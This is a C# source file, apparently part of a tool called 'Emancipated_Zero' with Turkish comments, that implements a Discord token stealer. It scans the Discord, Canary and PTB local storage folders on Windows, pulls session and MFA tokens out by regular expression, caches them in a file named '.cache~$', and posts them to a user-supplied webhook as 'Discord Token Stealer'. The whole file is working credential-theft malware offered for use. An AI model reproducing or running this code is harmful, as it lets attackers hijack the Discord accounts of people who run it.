using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;  // Newtonsoft.Json kütüphanesini ekleyin

namespace Emancipated_Zero
{
    class TokenGrabber
    {
        static string userwh;

        public static async Task DiscordTokenGrabber()
        {
            try
            {
                await TokenGrabber.TokenGrabberMain();  // Asenkron işlemi bekleyin
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}", Console.ForegroundColor = ConsoleColor.Red);
                Console.ReadKey();
            }
        }

        public static async Task TokenGrabberMain()
        {
            Console.Write("Enter your webhook: ");
            userwh = Console.ReadLine();

            try
            {
                await MainAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        public static async Task MainAsync()
        {
            var checkedTokens = new List<string>();
            var alreadyCachedTokens = new HashSet<string>();

            var paths = new Dictionary<string, string>
            {
                { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord") },
                { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary") },
                { "Discord PTB", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb") }
            };

            foreach (var path in paths.Values)
            {
                if (!Directory.Exists(path))
                {
                    continue;
                }
                foreach (var token in GetTokens(path))
                {
                    if (checkedTokens.Contains(token))
                    {
                        continue;
                    }
                    checkedTokens.Add(token);
                }
            }

            using (var file = new StreamWriter(".cache~$", true))
            {
                foreach (var token in checkedTokens)
                {
                    if (!alreadyCachedTokens.Contains(token))
                    {
                        await file.WriteLineAsync(token);
                        alreadyCachedTokens.Add(token);
                    }
                }
            }

            if (checkedTokens.Count == 0)
            {
                checkedTokens.Add("No tokens found");
            }

            var webhook = new
            {
                content = string.Join("\n", checkedTokens),
                username = "Discord Token Stealer"
            };

            try
            {
                var json = JsonConvert.SerializeObject(webhook);  // Newtonsoft.Json kullanarak serileştirme
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(userwh, content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending webhook: {ex.Message}");
            }
        }

        static List<string> GetTokens(string path)
        {
            path = Path.Combine(path, "Local Storage", "leveldb");
            var tokens = new List<string>();
            foreach (var fileName in Directory.GetFiles(path))
            {
                if (!fileName.EndsWith(".log") && !fileName.EndsWith(".ldb"))
                {
                    continue;
                }
                foreach (var line in File.ReadLines(fileName))
                {
                    var trimmedLine = line.Trim();
                    if (string.IsNullOrEmpty(trimmedLine))
                    {
                        continue;
                    }
                    foreach (var regex in new[] { @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", @"mfa\.[\w-]{84}" })
                    {
                        var matches = Regex.Matches(trimmedLine, regex);
                        foreach (Match match in matches)
                        {
                            tokens.Add(match.Value);
                        }
                    }
                }
            }
            return tokens;
        }

        static readonly HttpClient client = new HttpClient();  // HttpClient nesnesi
    }
}
